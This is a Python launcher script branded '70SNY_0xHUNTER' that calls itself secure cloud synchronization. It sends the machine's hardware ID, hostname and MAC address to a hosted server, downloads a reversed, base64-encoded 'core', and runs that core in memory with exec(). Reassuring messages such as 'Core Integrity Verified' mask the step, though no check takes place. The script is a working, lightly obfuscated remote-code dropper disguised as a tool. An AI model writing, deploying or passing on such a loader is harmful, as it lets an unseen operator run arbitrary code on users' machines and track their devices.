import subprocess
import requests
import os
import sys
import uuid
import platform
import base64
import socket
import time

RAILWAY_URL = "web-production-6e33.up.railway.app"

def get_device_info():
    try:
        hwid = str(uuid.getnode())
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        return hwid, hostname, mac
    except:
        return "Unknown", "Unknown", "Unknown"
    
def install_from_requirements():
    req_file = os.path.join(os.path.dirname(__file__), "requirements.txt")
    if not os.path.exists(req_file):
        return

    missing_libs = []
    with open(req_file, "r") as f:
        libraries = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    for lib in libraries:
        lib_name = lib.split('==')[0].split('>=')[0].strip().lower()
       
        import_name = "bs4" if lib_name == "beautifulsoup4" else lib_name
        import_name = "dotenv" if lib_name == "python-dotenv" else import_name
        
        try:
            __import__(import_name)
        except ImportError:
            missing_libs.append(lib)

    if missing_libs:
        print(f"\n[!] Missing Dependencies: {', '.join(missing_libs)}")
        choice = input("👉 Install required components now? (y/n): ").lower().strip()

        if choice == 'y':
            for lib in missing_libs:
                lib_name = lib.split('==')[0].split('>=')[0].strip().lower()
                print(f"📥 Installing {lib_name}...")
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
                    if "playwright" in lib_name:
                        print("🌐 Downloading Playwright binaries...")
                        subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
                except Exception as e:
                    print(f"❌ Failed to install {lib_name}: {e}")
            print("\n✅ Environment synchronized. Continuing to boot...\n")
        else:
            print("\n🛑 Execution aborted: Cannot run without dependencies.")
            time.sleep(2)
            sys.exit() 

def fetch_and_run():
    hwid, hostname, mac = get_device_info()
    params = {'hwid': hwid, 'device': hostname, 'mac': mac}

    try:
        print(f"🛰️ Connecting to Cloud Engine...")
        response = requests.get(
            f"https://{RAILWAY_URL}/get_core", 
            params=params, 
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            masked_payload = data.get("core", "")
            
            if masked_payload:
                print("🔓 Decrypting Security Layer...")
                unmasked_data = masked_payload[::-1]
                decoded_code = base64.b64decode(unmasked_data.encode('utf-8')).decode('utf-8')
                
                print("✅ Core Integrity Verified.")
                print("🚀 Booting Engine in Memory...")
                exec(decoded_code, globals())
            else:
                print("⚠️ Error: Engine Core is empty.")
        else:
            print(f"❌ Server Error: {response.status_code}")
    except Exception as e:
        print(f"❌ Boot Failure: {e}")

def main():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print("="*45)
    print("            🚀 70SNY_0xHUNTER ")
    print("         Secure Cloud Synchronization")
    print("="*45)
    
    
    try:
        import requests
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests

   
    install_from_requirements()
    
   
    fetch_and_run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
